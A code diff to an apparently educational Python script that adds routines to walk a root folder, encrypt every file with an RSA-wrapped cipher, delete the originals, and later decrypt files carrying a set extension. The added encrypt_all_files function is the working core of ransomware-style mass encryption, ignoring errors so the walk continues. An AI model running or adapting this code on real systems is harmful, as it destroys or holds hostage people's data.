@@ -2,6 +2,7 @@ import constants
 import encryption
 import json
 import base64
+from os import walk, path, remove
 
 
 def main():
@@ -15,6 +16,10 @@ def main():
 
     # Reads the encrypted json file, decrypts (but doesn't delete) it.
     decrypt_file(TEST_JSON, TEST_FILE + "_output.txt")
+
+    # For now, just remove one of these to see it work. I'll eventually add command line args to select
+    encrypt_all_files(constants.ROOT_FOLDER)
+    decrypt_all_files(constants.ROOT_FOLDER)
 
 
 def ensure_rsa_keys_exists():
@@ -70,6 +75,42 @@ def decrypt_file(infile, outfile):
 
     print(encryption.MyRSADecrypt(outfile, RSACipher, ciphertext, iv, tag,
                                   constants.RSA_PRIVATEKEY_FILEPATH))
+
+
+def encrypt_all_files(rootdir):
+    for dirName, subdirList, fileList in walk(rootdir):
+        for file in fileList:
+
+            try:
+
+                # TODO Exclude public key, private key, executable
+
+                filePath = path.join(dirName, file)
+                encrypt_file(filePath, filePath + constants.ENCRYPTED_EXTENSION)
+
+                remove(filePath)
+
+            except Exception as e:  # TODO Tighten exception
+                # Don't kill the whole walk on failure
+                print(e)
+
+
+def decrypt_all_files(rootdir):
+    for dirName, subdirList, fileList in walk(rootdir):
+        for file in fileList:
+
+            try:
+                # Only touch files that we've encrypted
+                if path.splitext(file)[1] == constants.ENCRYPTED_EXTENSION:
+                    filePath = path.join(dirName, file)
+                    decrypt_file(filePath,
+                                 path.splitext(filePath)[0])
+
+                    remove(filePath)
+
+            except Exception as e:  # TODO Tighten exception
+                # Don't kill the whole walk on failure
+                print(e)
 
 
 main()
